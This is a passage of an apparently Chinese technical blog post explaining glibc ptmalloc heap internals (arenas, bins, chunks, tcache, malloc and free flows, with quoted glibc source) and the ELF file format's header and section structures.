可用内存<br>For <span class="hljs-number">32</span> <span class="hljs-built_in">bit</span> systems:<br>     Number of arena = <span class="hljs-number">2</span> * number of cores.<br>For <span class="hljs-number">64</span> <span class="hljs-built_in">bit</span> systems:<br>     Number of arena = <span class="hljs-number">8</span> * number of cores.<br>main_arena 不在heap里且没有heap_info构,main_arena是全局变量因此可以在libc.so的data段找到<br></code></pre></td></tr></table></figure><p>堆管理器与用户的内存交易发生于arena中，可以理解为堆管理器向操作系统批发来的有冗余的内存库存</p><ol><li>main_arena和只有一个Heap_info的thread_arena<img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20201214141200784.png" alt="image-20201214141200784" /></li><li>有多个Heap_info的thread_arena<img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20201216114533285.png" alt="image-20201216114533285" /></li></ol><p>内存分配器中，为了解决多线程锁争夺问题，分为<strong>主分配区main_arena（分配区的本质就是内存池，管理着chunk，一般用英文arena表示）<strong>和</strong>非主分配区no_main_arena</strong>。 （主分配区和非主分配区的区别）</p><p>1. 主分配区和非主分配区形成一个<strong>环形链表</strong>进行管理。<br />　2. 每一个分配区利用<strong>互斥锁</strong>使线程对于<strong>该分配区的访问互斥</strong>。<br />　3. 每个进程只有<strong>一个主分配区</strong>，也可以允许有<strong>多个非主分配区</strong>。<br />　4. ptmalloc根据系统对分配区的争用动态增加分配区的大小，<strong>分配区的数量一旦增加，则不会减少</strong>。<br />　5. <strong>主分配区可以使用brk和mmap(一般不用)来分配</strong>，而<strong>非主分配区只能使用mmap来映射内存块</strong><br />　6. 申请小内存时会产生很多内存碎片，ptmalloc在<strong>整理时</strong>也需要对<strong>分配区做加锁操作</strong>。</p><p>当一个线程需要使用malloc分配内存的时候，会先查看该线程的私有变量中是否已经存在一个分配区。若是存在。会尝试对其进行加锁操作。若是<strong>加锁成功</strong>，就在<strong>使用该分配区分配内存</strong>，若是<strong>失败</strong>，就会<strong>遍历循环链表</strong>中获取一个<strong>未加锁的分配区</strong>。若是<strong>整个链表中都没有未加锁的分配区</strong>，则<strong>malloc会开辟一个新的分配区</strong>，将<strong>其加入全局的循环链表并加锁</strong>，然后使用<strong>该分配区</strong>进行<strong>内存分配</strong>。当<strong>释放这块内存</strong>时，同样会先<strong>获取待释放内存块</strong>所在的<strong>分配区的锁</strong>。若是有<strong>其他线程正在使用</strong>该分配区，则<strong>必须等待</strong>其他线程<strong>释放</strong>该分配区<strong>互斥锁之后</strong>才能<mark>进行</mark><strong>释放内存的操作</strong>。</p><p>需要注意几个点：</p><ul><li>主分配区通过brk进行分配，非主分配区通过mmap进行分配</li><li>从分配区虽然是mmap分配，但是和<strong>大于128K直接使用mmap分配没有任何联系</strong>。<strong>大于128K的内存使用mmap分配，使用完之后直接用munmap还给系统</strong></li><li>每个线程在malloc会先获取一个arena，使用arena内存池分配自己的内存，这里存在竞争问题</li><li>为了避免竞争，我们可以使用线程局部存储，<strong>thread cache（tcmalloc中的tc正是此意）</strong>，线程局部存储对area的改进原理如下：</li></ul><ol><li>如果需要在一个线程内部的各个函数调用都能访问、但其它线程不能访问的变量（被称为<strong>static memory local to a thread 线程局部静态变量</strong>），就需要新的机制来实现。这就是TLS。</li><li><strong>thread cache</strong>本质上是在<strong>static区</strong>为<strong>每一个thread</strong>开辟一个<strong>独有</strong>的<strong>空间</strong>，因为独有，不再有竞争</li><li>每次malloc时，先去线程局部存储空间中找arena，用thread cache中的arena分配存在thread arena中的chunk。当不够时才去找堆区的arena</li><li>C++11中提供thread_local方便于线程局部存储</li></ol><ul><li>实际上tcmalloc和jemalloc都不再使用主分配区，直接使用非主分配区</li></ul><h2 id="bins"><a class="markdownIt-Anchor" href="#bins"></a> bins</h2><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20201214115308952.png" alt="image-20201214115308952" /></p><h3 id="bins分类32位"><a class="markdownIt-Anchor" href="#bins分类32位"></a> bins分类(32位)</h3><p>64位*2</p><ol><li>Fast bins</li><li>unsorted bins</li><li>Small bins</li><li>Large bins</li><li>(tcache)</li></ol><p>small bins：小于512B的chunk</p><p>large bins： 512B-128K的chunk</p><p>unsorted bins：一般free的chunk大部分会存放到unsorted bins里，等下次申请的时候再分配。另外切割剩下的部分也会被放到unsorted bins。所以更多的像是一个temp，中转站。</p><p>fast bins：相当于bins的缓存，采用单链表的形式，便于快速查询使用。一般大小在0-64B</p><p>tcache: 比Fastbin要快(详情见tcache分栏) glibc2.26之后才出现</p><h3 id="bin的调用顺序"><a class="markdownIt-Anchor" href="#bin的调用顺序"></a> bin的调用顺序</h3><ol><li>fast bins：针对小字节的chunk，第一步先从fast chunk里面查找。因为是<code>单链表</code>，且是相同大小的，速度比较快。</li><li>smal bins：单个链表下chunk大小相同，不同链表的chunk间隔是88</li><li>unsorted bins：先查询unsorted bins有没有合适的，如果没有，会把fast bins拿过来，用于合并和切割。然后分配到small bins和large bins</li><li>large bins：一个链表中大小不一样，是处于一个范围内，间隔也不相同</li><li>top chunk：对于从large bins查找不到的内存块，需要从heap旁的chunk申请。可以通过移动brk指针</li><li>mmap chunk：对于大于128k，需要从mmap中申请</li></ol><h2 id="chunk"><a class="markdownIt-Anchor" href="#chunk"></a> chunk</h2><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20201215105207925.png" alt="" /></p><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20201215105113188.png" alt="image-20201215105113188" /></p><p><strong>A flag</strong>: NON_MAIN_ARENA，记录当前 chunk是否不属于主线程，1 表示不属于，0 表示属于。</p><p><strong>M flag</strong>: IS_MAPPED，记录当前 chunk 是否是由 mmap 分配的。</p><p><strong>P flag</strong>: PREV_INUSE，记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。</p><p><strong>注意</strong>，如果是个较大的chunk(一般是&gt;=<code>0x400</code>)，那么还会有<code>fd_nextsize</code>和<code>bk_nextsize</code>，largebin中的chunk是按照从大到小的顺序排列的(表头大，表尾小)，当有相同size的chunk时则按照free的时间顺序排序。同时相同size的chunk，只有第一个chunk会有<code>fd_nextsize</code>和<code>bk_nextsize</code>，其他的都没有，<code>fd_nextsize</code>和<code>bk_nextsize</code>置为0。</p><h3 id="top-chunk"><a class="markdownIt-Anchor" href="#top-chunk"></a> TOP chunk</h3><p>top chunk相当于分配区的顶部空闲内存（可能就是由brk调用控制的brk指针），<mark><strong>当bins上都不能满足内存分配要求的时候，就会来top chunk上分配</strong></mark>。<br />　　当top chunk大小比用户所请求大小<strong>还大</strong>的时候，top chunk会分为两个部分：User chunk（用户请求大小）和Remainder chunk（剩余大小）。其中Remainder chunk成为新的top chunk。<br />　　当top chunk大小<strong>小于</strong>用户所请求的大小时，top chunk就通过**sbrk（main arena）<strong>或</strong>mmap（thread arena）**系统调用来扩容。</p><h3 id="mmaped-chunk"><a class="markdownIt-Anchor" href="#mmaped-chunk"></a> mmaped chunk</h3><p>当**分配的内存非常大（大于分配阀值，默认128K）**的时候，需要被mmap映射，则会放到mmaped chunk上，当释放mmaped chunk上的内存的时候会直接交还给操作系统。 （chunk中的M标志位置1）</p><p>mmap得到的位置是连续的, 得到的chunk会接在上一次mmap之前, 通常最后一次mmap会是tls段</p><h3 id="last-remainder-chunk"><a class="markdownIt-Anchor" href="#last-remainder-chunk"></a> last remainder chunk</h3><p>Last remainder chunk是另外一种特殊的chunk，就像top chunk和mmaped chunk一样，不会在任何bins中找到这种chunk。当需要分配一个small chunk,但在small bins中找不到合适的chunk，如果last remainder chunk的大小大于所需要的small chunk大小，last remainder chunk被分裂成两个chunk，其中一个chunk返回给用户，另一个chunk变成新的last remainder chunk。</p><h2 id="fastbin"><a class="markdownIt-Anchor" href="#fastbin"></a> Fastbin</h2><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20201215111514380.png" alt="image-20201215111514380" /></p><h2 id="unsorted-bin"><a class="markdownIt-Anchor" href="#unsorted-bin"></a> <strong>unsorted bin</strong></h2><ul><li>bins[1]</li><li>管理刚刚释放还为分类的 chunk</li><li>可以视为空闲 chunk 回归其所属 bin 之前的缓冲区</li><li><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20201215111459904.png" alt="image-20201215111459904" /></li></ul><h2 id="small-bins"><a class="markdownIt-Anchor" href="#small-bins"></a> <strong>small bins</strong></h2><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20201215111629639.png" alt="image-20201215111629639" /></p><ul><li>bins[2] ~ bins[63]</li><li>62 个循环双向链表</li><li>FIFO</li><li>管理 16、24、32、40、 …… 、504 Bytes 的 free chunks（32位下）</li><li>每个链表中存储的 chunk 大小都一致</li></ul><h2 id="large-bins"><a class="markdownIt-Anchor" href="#large-bins"></a> <strong>large bins</strong></h2><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20201215111717462.png" alt="image-20201215111717462" /></p><ul><li>bins[64] ~ bins[126]</li><li>63 个循环双向链表</li><li>FIFO</li><li>管理大于 504 Bytes 的 free chunks（32位下）</li><li>large bins中的每一个bin分别包含了一个给定范围内的chunk，其中的chunk按大小递减排序，大小相同则按照最近使用时间排列。</li><li>分配时，遵循原则“smallest-first , best-fit”,从顶部遍历到底部以找到一个大小最接近用户需求的chunk。一旦找到，相应chunk就会分成两块User chunk（用户请求大小）返回给用户。 Remainder chunk 剩余部分添加到unsorted bin。free时和small bin 类似。</li><li>两个毗连的空闲chunk会被合并成一个空闲chunk。</li></ul><h3 id="chunk运行模式"><a class="markdownIt-Anchor" href="#chunk运行模式"></a> chunk运行模式</h3><p>想要Free当前chunk，nextchunk（chunk+size）也是被Free掉的；比如说当前chunk是64B，nextchunk是64B，当你Free当前chunk的时候，得到的是128B的chunk；chunk size 为把size位置最低3bits归0</p><p>要想知道当前chunk是不是in use，就要查看下一个chunk的prev_size的最低bit是不是1；free 会使得下一个chunk的prev_inuse bit 被设为0</p><p><mark><strong>malloc</strong></mark></p><p>•它根据用户申请的内存块大小以及相应大小 chunk 通常使用的频度（fastbin chunk, small chunk, large chunk），依次实现了不同的分配方法。</p><p>•它由小到大依次检查不同的 bin 中是否有相应的空闲块可以满足用户请求的内存。</p><p>•当所有的空闲 chunk 都无法满足时，它会考虑 top chunk。</p><p>•当 top chunk 也无法满足时，堆分配器才会进行内存块申请。</p><p><code>malloc</code></p><ul><li>找出一个可用的chunk,或者从top chunk切一个下来</li><li>如果chunk是回收的, 要先从bin里面unlink, 即移出linked list</li><li>填好结构,并传回chunk+10h</li></ul><p><mark><strong>free</strong></mark></p><p>•它将用户暂且不用的chunk回收给堆管理器，适当的时候还会归还给操作系统。</p><p>•它依据chunk大小来优先试图将free chunk链入tcache或者是fast bin。不满足则链入usorted bin中。</p><p>•在条件满足时free函数遍历usorted bin并将其中的物理相邻的free chunk合并，将相应大小的chunk分类放入small bin或large bin中。</p><p>•除了tcache chunk与fast bin chunk，其它chunk在free时会与其物理相邻的free chunk合并</p><p><code>free</code></p><ul><li>检查该chunk内存地址前后的chunk, 是不是not inuse</li><li>如果有, 则这些回收的内存可以被拼成一块</li><li>合并后的新chunk, 放入对应的bin中</li></ul><h2 id="tcache"><a class="markdownIt-Anchor" href="#tcache"></a> tcache</h2><p>tcache是libc2.26之后引进的一种新机制。</p><h3 id="原理及机制"><a class="markdownIt-Anchor" href="#原理及机制"></a> 原理及机制</h3><ul><li><p>简单来说就是类似fastbin一样的东西，每条链上最多可以有 7 个 chunk，free的时候当tcache满了才放入fastbin，unsorted bin，malloc的时候优先去tcache找</p></li><li><p>在tcache中新增了两个结构体，分别是tcache_entry和tcache_perthread_struct</p></li><li><p><code>tcache_prethread_struct</code> 是整个 tcache 的管理结构，其中有 64 项 entries。每个 entries 管理了若干个大小相同的 chunk，用``单向链表 (tcache_entry`) 的方式连接释放的 chunk，这一点上和 fastbin 很像</p></li><li><p>每个 thread 都会维护一个 <code>tcache_prethread_struct</code></p></li><li><p><code>tcache_prethread_struct</code> 中的 <code>counts</code> 记录 <code>entries</code> 中每一条链上 chunk 的数目，每条链上最多可以有 7 个 chunk</p></li><li><p><code>tcache_entry</code> 用于链接 chunk 结构体，其中的 <code>next</code> 指针指向下一个大小相同的 chunk</p><ul><li>这里与 fastbin 不同的是 fastbin 的 fd 指向 chunk 开头的地址，而 tcache 的 next 指向 user data 的地方，即 chunk header 之后<img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20201214144725483.png" alt="image-20201214144725483" /></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* We overlay this structure on the user-data portion of a chunk when the chunk is stored in the per-thread cache.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span><br>&#125; tcache_entry;<br><br><span class="hljs-comment">/* There is one of these for each thread, which contains the per-thread cache (hence "tcache_perthread_struct").  Keeping overall size low is mildly important.  Note that COUNTS and ENTRIES are redundant (we could have just counted the linked list each time), this is for performance reasons.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-keyword">char</span> counts[TCACHE_MAX_BINS];<br>  tcache_entry *entries[TCACHE_MAX_BINS];<br>&#125; tcache_perthread_struct;<br><span class="hljs-meta"># <span class="hljs-meta-keyword">define</span> TCACHE_MAX_BINS                64</span><br><span class="hljs-keyword">static</span> __thread tcache_perthread_struct *tcache = <span class="hljs-literal">NULL</span>;<br></code></pre></td></tr></table></figure><ul><li><p>其中有两个重要的函数， <code>tcache_get()</code> 和 <code>tcache_put()</code>:</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span><br>tcache_put (mchunkptr chunk, <span class="hljs-keyword">size_t</span> tc_idx)<br>&#123;<br>  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<br>  assert (tc_idx &lt; TCACHE_MAX_BINS);<br>  e-&gt;next = tcache-&gt;entries[tc_idx];<br>  tcache-&gt;entries[tc_idx] = e;<br>  ++(tcache-&gt;counts[tc_idx]);<br>&#125;<br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> *<br>tcache_get (<span class="hljs-keyword">size_t</span> tc_idx)<br>&#123;<br>  tcache_entry *e = tcache-&gt;entries[tc_idx];<br>  assert (tc_idx &lt; TCACHE_MAX_BINS);<br>  assert (tcache-&gt;entries[tc_idx] &gt; <span class="hljs-number">0</span>);<br>  tcache-&gt;entries[tc_idx] = e-&gt;next;<br>  --(tcache-&gt;counts[tc_idx]);<br>  <span class="hljs-keyword">return</span> (<span class="hljs-keyword">void</span> *) e;<br>&#125;<br></code></pre></td></tr></table></figure><p>这两个函数会在函数 <a href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l4173" target="_blank" rel="noopener">_int_free</a> 和 <a href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l3051" target="_blank" rel="noopener">__libc_malloc</a> 的开头被调用，其中 <code>tcache_put</code> 当所请求的分配大小不大于<code>0x408</code>并且当给定大小的 tcache bin 未满时调用。一个 tcache bin 中的最大块数<code>mp_.tcache_count</code>是<code>7</code></p><ul><li>根据tcache_get()的源码</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">static</span> __always_inline <span class="hljs-keyword">void</span> *<br>tcache_get (<span class="hljs-keyword">size_t</span> tc_idx)<br>&#123;<br>  tcache_entry *e = tcache-&gt;entries[tc_idx];<br>  assert (tc_idx &lt; TCACHE_MAX_BINS);<br>  assert (tcache-&gt;entries[tc_idx] &gt; <span class="hljs-number">0</span>);<br>  tcache-&gt;entries[tc_idx] = e-&gt;next;<br>  --(tcache-&gt;counts[tc_idx]);<br>  <span class="hljs-keyword">return</span> (<span class="hljs-keyword">void</span> *) e;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li></ul><p>在 <code>tcache_get</code> 中，仅仅检查了 <strong>tc_idx</strong> ，此外，我们可以将 tcache 当作一个类似于 fastbin 的单独链表，只是它的 check，并没有 fastbin 那么复杂，仅仅检查 <code>tcache-&gt;entries[tc_idx] = e-&gt;next;</code></p><h2 id="内存申请"><a class="markdownIt-Anchor" href="#内存申请"></a> 内存申请</h2><h3 id="没有tcache"><a class="markdownIt-Anchor" href="#没有tcache"></a> 没有tcache</h3><p>1、获取分配区的锁，防止多线程冲突。（一个进程有一个malloc管理器，而一个进程中的多个线程共享这一个管理器，有竞争，加锁）</p><p>2、计算出实际需要分配的内存的chunk实际大小。</p><p>3、判断chunk的大小，如果小于max_fast（64Ｂ），则尝试去fast bins上取适合的chunk，如果有则分配结束。否则，下一步；</p><p>4、判断chunk大小是否小于512B，如果是，则从small bins上去查找chunk，如果有合适的，则分配结束。否则下一步；</p><p>5、ptmalloc首先会遍历fast bins（注：这里是第二次遍历fast bins了，虽然fast bins一般不会合并，但此时会）中的chunk，将相邻的chunk进行合并，并链接到unsorted bin中然后遍历 unsorted bins。（总体而言，遍历unsorted bin，只是在遍历前先合并fast bin，遍历unsorted bin时一边遍历，一边放到small bin和large bin中）</p><ul><li>如果unsorted bins上只有一个chunk并且大于待分配的chunk，则进行切割，并且剩余的chunk继续扔回unsorted bins；</li><li>如果unsorted bins上有大小和待分配chunk相等的，则返回，并从unsorted bins删除；</li><li>如果unsorted bins中的某一chunk大小 属于small bins的范围，则放入small bins的头部；</li><li>如果unsorted bins中的某一chunk大小 属于large bins的范围，则找到合适的位置放入。若未分配成功，转入下一步；</li></ul><p>6、从large bins中查找找到合适的chunk之后，然后进行切割，一部分分配给用户，剩下的放入unsorted bin中。</p><p>7、如果搜索fast bins和bins都没有找到合适的chunk，那么就需要操作top chunk来进行分配了 。当top chunk大小比用户所请求大小还大的时候，top chunk会分为两个部分：User chunk（用户请求大小）和Remainder chunk（剩余大小）。其中Remainder chunk成为新的top chunk。 当top chunk大小小于用户所请求的大小时，top chunk就通过sbrk（main arena）或mmap（thread arena）系统调用来扩容。</p><p>8、到了这一步，说明 top chunk 也不能满足分配要求，所以，于是就有了两个选择: 如 果是主分配区，调用 sbrk()，增加 top chunk 大小；如果是非主分配区，调用 mmap 来分配一个新的 sub-heap，增加 top chunk 大小；或者使用 mmap()来直接分配。在 这里，需要依靠 chunk 的大小来决定到底使用哪种方法。判断所需分配的 chunk 大小是否大于等于 mmap 分配阈值，如果是的话，则转下一步，调用 mmap 分配， 否则跳到第 10 步，增加 top chunk 的大小。</p><p>9、使用 mmap 系统调用为程序的内存空间映射一块 chunk_size align 4kB 大小的空间。 然后将内存指针返回给用户。</p><p>10、判断是否为第一次调用 malloc，若是主分配区，则需要进行一次初始化工作，分配 一块大小为(chunk_size + 128KB) align 4KB 大小的空间作为初始的 heap。若已经初 始化过了，主分配区则调用 sbrk()增加 heap 空间，分主分配区则在 top chunk 中切 割出一个 chunk，使之满足分配需求，并将内存指针返回给用户。</p><h3 id="有tcache之后"><a class="markdownIt-Anchor" href="#有tcache之后"></a> 有tcache之后</h3><p>在内存分配的 malloc 函数中有多处，会将内存块移入 tcache 中。</p><p>（1）首先，申请的内存块符合 fastbin 大小时并且在 fastbin 内找到可用的空闲块时，会把该 fastbin 链上的其他内存块放入 tcache 中。</p><p>（2）其次，申请的内存块符合 smallbin 大小时并且在 smallbin 内找到可用的空闲块时，会把该 smallbin 链上的其他内存块放入 tcache 中。</p><p>（3）当在 unsorted bin 链上循环处理时，当找到大小合适的链时，并不直接返回，而是先放到 tcache 中，继续处理。</p><p><mark>举例</mark></p><ul><li>第一次 malloc 时，会先 malloc 一块内存用来存放 <code>tcache_prethread_struct</code></li><li>free 内存，且 size 小于 small bin size 时<ul><li>tcache 之前会放到 fastbin 或者 unsorted bin 中</li><li>tcache 后：<ul><li>先放到对应的 tcache 中，直到 tcache 被填满（默认是 7 个）</li><li>tcache 被填满之后，再次 free 的内存和之前一样被放到 fastbin 或者 unsorted bin 中</li><li>tcache 中的 chunk 不会合并（不取消 inuse bit）</li></ul></li></ul></li><li>malloc 内存，且 size 在 tcache 范围内<ul><li>先从 tcache 取 chunk，直到 tcache 为空</li><li>tcache 为空后，从 bin 中找</li><li>tcache 为空时，如果 <code>fastbin/smallbin/unsorted bin</code> 中有 size 符合的 chunk，会先把 <code>fastbin/smallbin/unsorted bin</code> 中的 chunk 放到 tcache 中，直到填满。之后再从 tcache 中取；因此 chunk 在 bin 中和 tcache 中的顺序会反过来</li></ul></li></ul><p><a href="https://m4x.fun/post/dive-into-tcache/" target="_blank" rel="noopener">tcache源码及参考资料</a></p><h2 id="内存回收"><a class="markdownIt-Anchor" href="#内存回收"></a> 内存回收</h2><h3 id="没有tcache-2"><a class="markdownIt-Anchor" href="#没有tcache-2"></a> 没有tcache</h3><ol><li>获取分配区的锁，保证线程安全。</li><li>如果free的是空指针，则返回，什么都不做。</li><li>判断当前chunk是否是mmap映射区域映射的内存，如果是，则直接munmap()释放这块内存。前面的已使用chunk的数据结构中，我们可以看到有M来标识是否是mmap映射的内存。</li><li>判断chunk是否与top chunk相邻，如果相邻，则直接和top chunk合并（和top chunk相邻相当于和分配区中的空闲内存块相邻）。转到步骤8</li><li>如果chunk的大小大于max_fast（64b），则放入unsorted bin，并且检查是否有合并，有合并情况并且和top chunk相邻，则转到步骤8；没有合并情况则free。</li><li>如果chunk的大小小于 max_fast（64b），则直接放入fast bin，fast bin并没有改变chunk的状态。没有合并情况，则free；有合并情况，转到步骤7</li><li>在fast bin，如果当前chunk的下一个chunk也是空闲的，则将这两个chunk合并，放入unsorted bin上面。合并后的大小如果大于64B，会触发进行fast bins的合并操作，fast bins中的chunk将被遍历，并与相邻的空闲chunk进行合并，合并后的chunk会被放到unsorted bin中，fast bin会变为空。合并后的chunk和topchunk相邻，则会合并到topchunk中。转到步骤8</li><li>判断top chunk的大小是否大于mmap收缩阈值（默认为128KB），如果是的话，对于主分配区，则会试图归还top chunk中的一部分给操作系统。free结束。</li></ol><h1 id="elf文件解析"><a class="markdownIt-Anchor" href="#elf文件解析"></a> ELF文件解析</h1><p>首先，ELF文件格式提供了两种视图，分别是链接视图和执行视图。<img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/20160521110158483" alt="ELF Format" /></p><p>链接视图是以节（section）为单位，执行视图是以段（segment）为单位。链接视图就是在链接时用到的视图，而执行视图则是在执行时用到的视图。上图左侧的视角是从链接来看的，右侧的视角是执行来看的。总个文件可以分为四个部分：</p><figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">- ELF header： 描述整个文件的组织。<br>- Program Header Table: 描述文件中的各种segments，用来告诉系统如何创建进程映像的。<br>- sections 或者 segments：segments是从运行的角度来描述elf文件，sections是从链接的角度来描述elf文件，也就是说，在链接阶段，我们可以忽略program header table来处理此文件，在运行阶段可以忽略section header table来处理此程序（所以很多加固手段删除了section header table）。从图中我们也可以看出，segments与sections是包含的关系，一个segment包含若干个section。<br>- Section Header Table: 包含了文件各个segction的属性信息，我们都将结合例子来解释。<br></code></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/20160521110434854" alt="这里写图片描述" /></p><p><strong>程序头部表</strong>（Program Header Table），如果存在的话，告诉系统如何创建进程映像。<br /><strong>节区头部表</strong>（Section Header Table）包含了描述文件节区的信息，比如大小、偏移等。</p><p><strong>尽管图中显示的各个组成部分是有顺序的，实际上除了 ELF 头部表以外，其他节区和段都没有规定的顺序</strong></p><p><mark>32位ELF文件中常用的数据格式：</mark></p><p>​</p><table><thead><tr><th>名称</th><th>大小</th><th>对齐</th><th>目的</th></tr></thead><tbody><tr><td>Elf32_Addr</td><td>4</td><td>4</td><td>无符号程序地址</td></tr><tr><td>Elf32_Half</td><td>2</td><td>2</td><td>无符号中等整数</td></tr><tr><td>Elf32_Off</td><td>4</td><td>4</td><td>无符号文件偏移</td></tr><tr><td>Elf32_SWord</td><td>4</td><td>4</td><td>有符号大整数</td></tr><tr><td>Elf32_Word</td><td>4</td><td>4</td><td>无符号大整数</td></tr><tr><td>unsigned char</td><td>1</td><td>1</td><td>无符号小整数</td></tr></tbody></table><p>ELF Header结构体:</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> EI_NIDENT 16</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>       <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> e_ident[EI_NIDENT];<br>       ELF32_Half e_type;<br>       ELF32_Half e_machine;<br>       ELF32_Word e_version;<br>       ELF32__Addr e_entry;<br>       ELF32_Off e_phoff;<br>       ELF32_Off e_shoff;<br>       ELF32_Word e_flags;<br>       ELF32_Half e_ehsize;<br>       ELF32_Half e_phentsize;<br>       ELF32_Half e_phnum;<br>       ELF32_Half e_shentsize;<br>       ELF32_Half e_shnum;<br>       ELF32_Half e_shstrndx;<br>&#125;Elf32_Ehdr;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">e_ident ： ELF的一些标识信息，前四位为.ELF,其他的信息比如大小端等<br>e_machine ： 文件的目标体系架构，比如ARM<br>e_version : <span class="hljs-number">0</span>为非法版本，<span class="hljs-number">1</span>为当前版本<br>e_entry ： 程序入口的虚拟地址<br>e_phoff ： 程序头部表偏移地址<br>e_shoff ： 节区头部表偏移地址<br>e_flags ：保存与文件相关的，特定于处理器的标志<br>e_ehsize ：ELF头的大小<br>e_phentsize ： 每个程序头部表的大小<br>e_phnum ：程序头部表的数量<br>e_shentsize：每个节区头部表的大小<br>e_shnum ： 节区头部表的数量<br>e_shstrndx：节区字符串表位置<br></code></pre></td></tr></table></figure><h2 id="section"><a class="markdownIt-Anchor" href="#section"></a> Section</h2><p>有些节区是系统预订的，一般以点开头号，因此，我们有必要了解一些常用到的系统节区。</p><table><thead><tr><th>名称</th><th>类型</th><th>属性</th><th>含义</th></tr></thead><tbody><tr><td>.bss</td><td>SHT_NOBITS</td><td>SHF_ALLOC +  SHF_WRITE</td><td>包含将出现在程序的内存映像中的为初始化数据。根据定义，当程序开始执行，系统将把这些数据初始化为 0。此节区不占用文件空间。</td></tr><tr><td>.comment</td><td>SHT_PROGBITS</td><td>(无)</td><td>包含版本控制信息。</td></tr><tr><td>.data</td><td>SHT_PROGBITS</td><td>SHF_ALLOC + SHF_WRITE</td><td>这些节区包含初始化了的数据，将出现在程序的内存映像中。</td></tr><tr><td>.data1</td><td>SHT_PROGBITS</td><td>SHF_ALLOC + SHF_WRITE</td><td>这些节区包含初始化了的数据，将出现在程序的内存映像中。</td></tr><tr><td>.debug</td><td>SHT_PROGBITS</td><td>(无)</td><td>此节区包含用于符号调试的信息。</td></tr><tr><td>.dynamic</td><td>SHT_DYNAMIC</td><td></td><td>此节区包含动态链接信息。节区的属性将包含 SHF_ALLOC 位。是否 SHF_WRITE 位被设置取决于处理器。</td></tr><tr><td>.dynstr</td><td>SHT_STRTAB</td><td>SHF_ALLOC</td><td>此节区包含用于动态链接的字符串，大多数情况下这些字符串代表了与符号表项相关的名称。</td></tr><tr><td>.dynsym</td><td>SHT_DYNSYM</td><td>SHF_ALLOC</td><td>此节区包含了动态链接符号表。</td></tr><tr><td>.fini</td><td>SHT_PROGBITS</td><td>SHF_ALLOC + SHF_EXECINSTR</td><td>此节区包含了可执行的指令，是进程终止代码的一部分。程序正常退出时，系统将安排执行这里的代码。</td></tr><tr><td>.got</td><td>SHT_PROGBITS</td><td></td><td>此节区包含全局偏移表。</td></tr><tr><td>.hash</td><td>SHT_HASH</td><td>SHF_ALLOC</td><td>此节区包含了一个符号哈希表。</td></tr><tr><td>.init</td><td>SHT_PROGBITS</td><td>SHF_ALLOC + SHF_EXECINSTR</td><td>此节区包含了可执行指令，是进程初始化代码的一部分。当程序开始执行时，系统要在开始调用主程序入口之前（通常指 C 语言的 main 函数）执行这些代码。</td></tr><tr><td>.interp</td><td>SHT_PROGBITS</td><td></td><td>此节区包含程序解释器的路径名。如果程序包含一个可加载的段，段中包含此节区，那么节区的属性将包含 SHF_ALLOC 位，否则该位为 